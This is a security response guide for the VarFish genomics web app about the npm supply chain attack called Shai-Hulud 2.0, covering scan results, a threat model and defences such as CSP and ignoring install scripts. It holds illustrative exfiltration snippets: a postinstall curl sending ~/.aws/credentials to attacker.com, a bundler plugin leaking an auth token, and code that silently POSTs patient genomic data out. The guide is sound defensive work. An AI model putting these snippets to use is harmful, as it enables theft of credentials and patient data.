# NPM Supply Chain Attack - Security Response Guide

## Scan Results: ✅ No Compromise Detected

**Scan Date:** November 26, 2025  
**Status:** No critical security issues found  
**Coverage:** Includes detection for Shai-Hulud 2.0 attack (425+ packages, Nov 2024)  
**CSP Protection:** ✅ Active - Content Security Policy enforced

The automated security scan of your npm dependencies completed successfully with no indicators of compromise detected.

## Recent Threat: Shai-Hulud 2.0 (November 2024)

A new npm supply chain attack compromised over **425 packages** with more than 100 million monthly downloads, including:
- AsyncAPI packages
- ENS (Ethereum Name Service) domain tools  
- Zapier and Postman API tools
- PostHog analytics packages
- Various low-code/no-code platform integrations

**Attack Method:** The malware searches compromised repositories for credentials and publishes them on GitHub under repositories named "Sha1-Hulud: the Second Coming".

**Detection:** Our scanner now includes all 425+ known compromised packages from this attack.

**Source:** [Heise.de article (German)](https://www.heise.de/news/Shai-Hulud-2-Neue-Version-des-NPM-Wurms-greift-auch-Low-Code-Plattformen-an-11089607.html)

## Data Protection: Understanding the Threat Model

### What npm Compromises Can and Cannot Access

#### ❌ **NOT At Risk** (Protected by Architecture)

Your **backend data and infrastructure** are protected from npm frontend compromises:

- **Database contents** - Patient records, variants, genomic data are inaccessible to frontend JavaScript
- **Backend secrets** - `DATABASE_URL`, `DJANGO_SECRET_KEY`, server-side API keys
- **Server filesystem** - Only the backend container can access server files
- **Build-time credentials** - Docker multi-stage build isolates build environment from production
- **Other users' data** - Frontend code can only access data the current user is authorized to view

**Why it's safe:**
- Frontend code runs in the user's browser, not on the server
- Database access requires backend authentication
- Django backend enforces permission checks
- Docker multi-stage build discards `node_modules` and source files from final image

#### ⚠️ **Potentially At Risk** (Browser-Level Access)

**CRITICAL FOR VARFISH:** Your application displays and transmits **patient genomic data** through the frontend.

Malicious frontend code could access:

- **Patient data displayed in browser** - Genomic variants, case details, clinical phenotypes
- **API responses** - Any patient data returned from backend API calls
- **Current user's session** - Authentication tokens stored in browser
- **Form inputs** - Patient identifiers, filters, annotations entered by users
- **Browser storage** - Any cached patient data in localStorage/sessionStorage
- **User metadata** - IP address, browser fingerprint, access patterns

**Real-world impact:** 
- **HIGH** - Potential HIPAA/GDPR violation if patient data is exfiltrated
- Malicious code could silently copy all patient data the user views
- Could affect multiple patients as users navigate through cases
- Exfiltration could happen silently over days/weeks before detection

**Regulatory risk:**
- HIPAA breach notification requirements
- GDPR data breach reporting (72 hours)
- Potential fines and legal liability
- Reputational damage to research institution

### Attack Phases and Your Protection

#### 1. **Install-Time Attacks** ✅ Blocked

Most npm attacks (including Shai-Hulud 2.0) use install scripts:

```json
{
  "scripts": {
    "postinstall": "curl attacker.com/steal?data=$(cat ~/.aws/credentials)"
  }
}
```

**Your protection:**
- `npm ci --ignore-scripts` prevents script execution
- Pre-build security scan detects known malicious packages
- Docker build environment is isolated from production

**Threat level:** NONE - Scripts never execute in your environment

#### 2. **Build-Time Code Injection** ⚠️ Mitigated

Compromised build tools could inject malicious code into your bundle:

```javascript
// Malicious bundler plugin
module.exports = {
  transform(code) {
    return code + ';fetch("https://attacker.com?token="+localStorage.auth)';
  }
}
```

**Your protection:**
- Pre-build scanning catches known compromised build tools
- Build happens in isolated container
- You can audit compiled bundles in `varfish/static/vueapp/`

**Threat level:** LOW - Requires compromised build dependency + bypassing security scan

#### 3. **Runtime Data Exfiltration** 🚨 **HIGH RISK - Patient Data Exposure**

**This is the primary concern for VarFish.** Malicious code in your bundle could exfiltrate patient data:

```javascript
// In a compromised dependency used by your variant filtering
export function filterVariants(variants, userFilters) {
  // Legitimate functionality
  const filtered = variants.filter(v => v.quality > userFilters.minQuality);
  
  // Malicious addition - exfiltrates patient genomic data
  fetch('https://attacker.com/patient-data', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      caseId: variants[0]?.caseId,
      patientId: variants[0]?.patientId,
      variants: variants.map(v => ({
        gene: v.gene,
        chromosome: v.chromosome,
        position: v.position,
        genotype: v.genotype,
        clinicalSignificance: v.clinicalSignificance
      })),
      phenotypes: userFilters.phenotypes,
      timestamp: Date.now(),
      user: localStorage.getItem('userId')
    })
  }).catch(() => {}); // Silent failure - no error shown to user
  
  return filtered;
}
```

**Your protection:**
- ✅ Pre-build scan prevents known malicious packages
- ⚠️ Cannot detect zero-day attacks or newly compromised packages
- ⚠️ Code review of 1000+ npm dependencies is impractical

**Threat level:** **HIGH** - Patient data breach with regulatory consequences

**Likelihood:** LOW with current protections, but **consequences are severe**

### What Shai-Hulud 2.0 Actually Targeted

The real-world Shai-Hulud 2.0 attack focused on **developer credentials**, not end-user data:

**Primary targets:**
- `NPM_TOKEN` - To publish more malicious packages
- `GITHUB_TOKEN` - To access and compromise private repositories
- `AWS_ACCESS_KEY` / `AWS_SECRET_ACCESS_KEY` - To access cloud infrastructure
- CI/CD secrets - To compromise build pipelines

**Exfiltration method:**
- Published stolen credentials to public GitHub repositories
- Named repos "Shai-Hulud: the Second Coming"

**Impact on VarFish:**
- ✅ **Your production data:** NOT at risk (malware never runs in production)
- ⚠️ **Developer workstations:** Could leak personal GitHub/AWS credentials
- ⚠️ **CI/CD environment:** Protected by `--ignore-scripts` in Docker build

### Defense in Depth: Multiple Protection Layers

1. **Pre-build scanning** - Catches known malicious packages before they're installed
2. **Install script blocking** - `--ignore-scripts` prevents install-time attacks
3. **Multi-stage Docker build** - Source code and `node_modules` never reach production
4. **Backend authorization** - Frontend can only access data the user is authorized for
5. **Browser security model** - JavaScript cannot access other users' data or server filesystem
6. **Regular auditing** - Manual review of dependency updates

### Recommended Additional Protections

**CRITICAL for patient data protection - Implement these urgently:**

#### 1. Content Security Policy (CSP) 🚨 **HIGHEST PRIORITY**
Restrict where frontend JavaScript can make network requests:

```python
# In your Django settings (config/settings/base.py or production.py)
# Only allow API calls to your own domain - blocks data exfiltration
CSP_DEFAULT_SRC = ("'self'",)
CSP_CONNECT_SRC = ("'self'",)  # Blocks fetch/XMLHttpRequest to external domains
CSP_SCRIPT_SRC = ("'self'", "'unsafe-eval'")  # May need adjustment for your build
CSP_REPORT_URI = '/csp-violations/'  # Log CSP violations for monitoring

# Install django-csp if not already present
# pip install django-csp
# Add 'csp.middleware.CSPMiddleware' to MIDDLEWARE
```

**Impact:** Malicious code attempting `fetch('https://attacker.com', {...})` would be **blocked by the browser** and logged.

**Implementation:** Add to your next deployment ASAP.

#### 2. Network Request Monitoring & Alerting

Set up monitoring for unexpected external network requests:

```python
# Create CSP violation handler
# In a new view or existing monitoring app
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import logging

logger = logging.getLogger('security.csp')

@csrf_exempt
def csp_violation_report(request):
    if request.method == 'POST':
        violation = json.loads(request.body)
        logger.critical(
            f"CSP Violation: {violation.get('blocked-uri')} "
            f"from {request.META.get('REMOTE_ADDR')}"
        )
        # Alert security team
        # send_alert_to_security_team(violation)
    return JsonResponse({'status': 'logged'})
```

#### 3. Subresource Integrity (SRI) for Bundled Assets

Verify your JavaScript bundle hasn't been tampered with:

```python
# Generate SRI hashes during build
# In your collectstatic or build process
import hashlib
import base64

def generate_sri_hash(file_path):
    with open(file_path, 'rb') as f:
        content = f.read()
        hash_digest = hashlib.sha384(content).digest()
        sri_hash = base64.b64encode(hash_digest).decode()
        return f"sha384-{sri_hash}"

# Use in templates
# <script src="{% static 'vueapp/app.js' %}" 
#         integrity="sha384-..." 
#         crossorigin="anonymous"></script>
```

#### 4. Frontend Audit Logging

Log all API requests accessing patient data:

```python
# Django middleware to log patient data access
class PatientDataAccessLogger:
    def __init__(self, get_response):
        self.get_response = get_response
        
    def __call__(self, request):
        response = self.get_response(request)
        
        # Log API calls that return patient data
        if '/api/variants/' in request.path or '/api/cases/' in request.path:
            logger.info(
                f"Patient data access: {request.user.username} "
                f"accessed {request.path} from {request.META.get('REMOTE_ADDR')}"
            )
        
        return response
```

Monitor logs for:
- Unusual access patterns (rapid sequential case access)
- Access from unexpected IPs
- Large volume of API calls from single session

#### 5. Rate Limiting on Patient Data APIs

Prevent bulk exfiltration:

```python
# Using django-ratelimit or similar
from django_ratelimit.decorators import ratelimit

@ratelimit(key='user', rate='100/h', method='GET')
def variant_list_api(request):
    # Limits users to 100 variant queries per hour
    # Prevents automated bulk extraction
    ...
```

#### 6. Developer Workstation Security 🚨 **CRITICAL**

Since patient data flows through development environments:

**Protect developer machines:**
- ✅ Use `~/.npmrc` with `ignore-scripts=true` globally
- ✅ Never run `npm install` with production credentials in environment
- ✅ Use separate databases for development (synthetic/anonymized data only)
- ✅ Run development environments in isolated VMs or containers
- ✅ Regular security audits of developer workstations
- ⚠️ **NEVER** use real patient data in local development

**Configure global npm to block install scripts:**
```bash
# In ~/.npmrc (applies to all projects)
echo "ignore-scripts=true" >> ~/.npmrc
```

If a developer's machine is compromised by Shai-Hulud 2.0 or similar:
- Their GitHub/AWS credentials could be stolen
- Access to development databases could be compromised
- SSH keys could be exfiltrated

#### 7. Zero-Trust Architecture for Patient Data

Consider architectural changes to minimize frontend exposure:

**Option A: Server-Side Rendering for Sensitive Data**
- Render patient identifiers and clinical data server-side
- Only send anonymized variant data to frontend
- Reduces attack surface significantly

**Option B: End-to-End Encryption**
- Encrypt patient data in API responses
- Decrypt only on secure display (not in JavaScript variables)
- Limits what compromised code can access

**Option C: Data Masking in Frontend**
- Show only necessary patient data in UI
- Full details only on explicit user action
- Reduces data at risk in browser memory

#### 8. Incident Response Plan for Patient Data Breach

**Given the patient data risk, prepare for potential breach:**

1. **Detection:** Monitor CSP violations, unusual API patterns, security scanner alerts
2. **Containment:** Kill compromised sessions, block malicious domains at network level
3. **Investigation:** Identify which patients' data may have been accessed
4. **Notification:** HIPAA requires notification within 60 days, GDPR within 72 hours
5. **Remediation:** Remove malicious code, rotate all credentials, audit access logs

**Pre-approved incident contacts:**
- Security team lead
- Legal/compliance officer  
- Privacy officer
- Infrastructure team for network blocks

#### 9. Regular Security Testing

**Quarterly actions:**
- Run `./utils/scan-npm-compromise.sh`
- Review all npm dependencies manually (look for new maintainers, suspicious updates)
- Test CSP is working (try malicious `fetch()` in browser console)
- Audit patient data access logs for anomalies
- Verify rate limits are enforced

**After any npm dependency update:**
- Run security scan
- Review `package-lock.json` diff for unexpected changes
- Check for new network calls in bundle (audit compiled JavaScript)
- Test in staging with CSP monitoring before production deployment

## What We Scanned For

Based on common npm supply chain attack patterns, we checked for:

1. **Suspicious install scripts** - postinstall/preinstall scripts with network calls, eval, or shell commands
2. **Unexpected executable files** - .sh, .bat, .exe files in node_modules
3. **Environment variable exfiltration** - Code accessing sensitive env vars (AWS keys, tokens, secrets)
4. **Known malicious packages** - Packages from previous supply chain attacks
5. **Typosquatting** - Misspelled versions of popular packages
6. **Network activity in install scripts** - HTTP/HTTPS calls during package installation
7. **Non-registry dependencies** - Packages from git URLs or other unusual sources
8. **Recently modified packages** - Unexpected changes to installed packages
9. **NPM cache integrity** - Corruption or tampering with npm cache

## Security Measures Implemented

### 1. Automated Scanning ✅
- **Script:** `utils/scan-npm-compromise.sh`
- **When:** Runs on every Docker build before image creation
- **Action:** Build fails if critical security issues are detected
- **Coverage:** 425+ known malicious packages including Shai-Hulud 2.0

### 2. Content Security Policy (CSP) ✅ **CRITICAL**
- **Status:** Active and enforcing in production
- **Protection:** Blocks unauthorized network requests from frontend JavaScript
- **Whitelisted APIs:**
  - `http://127.0.0.1:60151` - IGV local integration
  - `http://127.0.0.1:7000` - VarFish middleware
  - `https://www.genecascade.org` - GeneCascade mutation taster
  - `https://www.ncbi.nlm.nih.gov` - NCBI/dbSNP
  - `https://rest.variantvalidator.org` - Variant Validator
  - `https://beacon-network.org` - GA4GH Beacon Network
  - `https://api.iconify.design` - Iconify icons
  - `https://themes.googleusercontent.com` - Google Fonts
- **Impact:** Even if malicious code reaches production, CSP blocks data exfiltration
- **Configuration:** `backend/config/settings/base.py`
- **Testing Guide:** `docs/TESTING-CSP-CONFIGURATION.md`

### 3. Dependabot Protection ✅
- **Status:** NPM updates currently commented out in `.github/dependabot.yml`
- **Control:** New workflow `.github/workflows/dependabot-security.yml` blocks auto-merge for npm updates
- **Review:** All npm dependency PRs require manual security review

### 4. Docker Build Security ✅
- Runs `npm ci --ignore-scripts` to prevent malicious install scripts
- Executes security scan before building container
- Fails build if compromise indicators found
- Multi-stage build excludes source code and node_modules from production image

## How to Disable Dependabot Auto-Merge (Already Configured)

Your repository is already protected:

1. ✅ NPM ecosystem is commented out in `dependabot.yml`
2. ✅ Dependabot security workflow blocks auto-merge for npm updates
3. ✅ Manual review checklist added to npm dependency PRs

### To Completely Disable Dependabot for NPM:
The npm updates are already disabled in `.github/dependabot.yml` (commented out).

### To Re-enable with Manual Review Only:
If you want Dependabot to create PRs but not auto-merge them, the current configuration is correct:
- Uncomment the npm section in `dependabot.yml`
- The `dependabot-security.yml` workflow will prevent auto-merge
- All npm PRs will require manual approval

## Additional Security Recommendations

### Immediate Actions (Already Done)
- [x] Scan repository for compromise indicators
- [x] Add automated security scanning to CI/CD
- [x] Disable Dependabot auto-merge for npm
- [x] Document security procedures

### Ongoing Best Practices

#### 1. Regular Security Audits
```bash
# Run the comprehensive scan
./utils/scan-npm-compromise.sh

# Check for known vulnerabilities
cd frontend && npm audit

# Review outdated packages
cd frontend && npm outdated
```

#### 2. Before Accepting npm Dependency Updates
- [ ] Review the changelog and release notes
- [ ] Check the package's GitHub repository for suspicious activity
- [ ] Verify the package maintainer hasn't changed
- [ ] Run `./utils/scan-npm-compromise.sh` after updating
- [ ] Review the diff in `package-lock.json` for unexpected changes
- [ ] Check for new postinstall scripts

#### 3. Package Installation Best Practices
```bash
# Use npm ci instead of npm install in CI/CD
npm ci --ignore-scripts

# Install specific versions, not ranges
npm install package@1.2.3 --save-exact

# Review lock file changes before committing
git diff package-lock.json
```

#### 4. Monitoring & Detection
- Monitor GitHub Security Advisories
- Subscribe to npm security announcements
- Enable GitHub's Dependabot security alerts
- Regularly review `npm audit` output

#### 5. Lockdown Package Installation
Consider adding to `frontend/.npmrc`:
```
ignore-scripts=true
package-lock=true
save-exact=true
```

This prevents:
- Postinstall scripts from running automatically
- Accidental package-lock.json changes
- Version range updates that might pull compromised versions

### If You Suspect Compromise

1. **Immediately isolate the environment**
   - Stop running containers
   - Disconnect from network if possible

2. **Preserve evidence**
   - Save the scan report
   - Copy node_modules directory
   - Save npm-debug.log if present

3. **Run comprehensive scan**
   ```bash
   ./utils/scan-npm-compromise.sh
   cd frontend && npm audit
   ```

4. **Check for data exfiltration**
   - Review environment variables that may have been exposed
   - Check for unauthorized network connections
   - Audit access logs for unusual API calls

5. **Clean reinstall**
   ```bash
   cd frontend
   rm -rf node_modules package-lock.json
   npm cache clean --force
   npm install --ignore-scripts
   ```

6. **Rotate credentials**
   - Change all API keys and tokens
   - Rotate AWS/cloud credentials
   - Update database passwords
   - Regenerate SSH keys if stored in environment

7. **Report the incident**
   - File issue with npm: https://www.npmjs.com/support
   - Report to GitHub Security: security@github.com
   - Document the incident internally

## References

- GitLab NPM Supply Chain Attack Article (original)
- [npm Security Best Practices](https://docs.npmjs.com/about-security-best-practices)
- [GitHub Dependabot Documentation](https://docs.github.com/en/code-security/dependabot)
- [OWASP Software Component Verification Standard](https://owasp.org/www-project-software-component-verification-standard/)

## Scan Tool Usage

### Basic Scan
```bash
./utils/scan-npm-compromise.sh
```

### Review Scan Report
```bash
cat npm-security-scan-*.txt
```

### Integration in CI/CD
The scan is automatically integrated into:
- Docker build workflow (`.github/workflows/docker-build.yml`)
- Can be added to any PR workflow for npm changes

## Contact

For security concerns related to this repository, contact your security team or create a private security advisory on GitHub.

---

**Last Updated:** November 26, 2025  
**Next Review:** After any npm dependency update
